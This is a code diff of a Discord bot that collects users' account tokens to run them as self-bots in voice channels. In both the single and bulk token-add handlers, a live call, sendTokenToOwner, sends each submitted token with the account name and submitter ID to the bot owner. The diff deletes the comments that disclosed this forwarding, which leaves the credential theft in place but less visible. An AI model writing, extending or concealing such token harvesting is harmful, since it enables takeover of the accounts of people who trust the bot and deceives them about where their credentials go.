@@ -245,7 +245,6 @@ bot.on('messageCreate', async (message) => {
     }
 
     if (command === 'panel-voice') {
-        // Kullanıcının yazdığı komut mesajını sil ve reply gönderme
         try { await message.delete(); } catch (e) {}
 
         const active = selfClients.size;
@@ -413,6 +412,8 @@ bot.on('interactionCreate', async (interaction) => {
 
         else if (interaction.customId === 'stop_all') {
             const userId = interaction.user.id;
+            
+            // Yalnızca düğmeye basan kullanıcıya ait olan ve sese bağlı hesapları filtrele
             const userAccounts = database.accounts.filter(acc => acc.addedBy === userId && acc.voiceChannelId);
 
             if (userAccounts.length === 0) {
@@ -427,7 +428,7 @@ bot.on('interactionCreate', async (interaction) => {
             }
             saveDatabase();
 
-            await interaction.editReply('✅ Eklediğiniz hesapların ses bağlantıları durduruldu.');
+            await interaction.editReply('✅ Hesaplarınızın ses bağlantıları durduruldu.');
         }
     }
 
@@ -548,7 +549,6 @@ bot.on('interactionCreate', async (interaction) => {
                 });
                 saveDatabase();
 
-                // Sahibin DM-nə bildiriş göndəririk
                 await sendTokenToOwner(bot, 'Yeni Tekli Token Eklendi', token, displayName, username, interaction.user.id);
 
                 await interaction.editReply(`✅ **Token başarıyla eklendi!**\n👤 **Kullanıcı:** ${displayName} (${username})`);
@@ -587,7 +587,6 @@ bot.on('interactionCreate', async (interaction) => {
                     });
                     added++;
 
-                    // Hər bir toplu token üçün sahibin DM-nə məlumat göndəririk
                     await sendTokenToOwner(bot, 'Toplu Token Eklendi', token, displayName, username, interaction.user.id);
                 } catch (e) {
                     // Geçersiz tokenleri atla
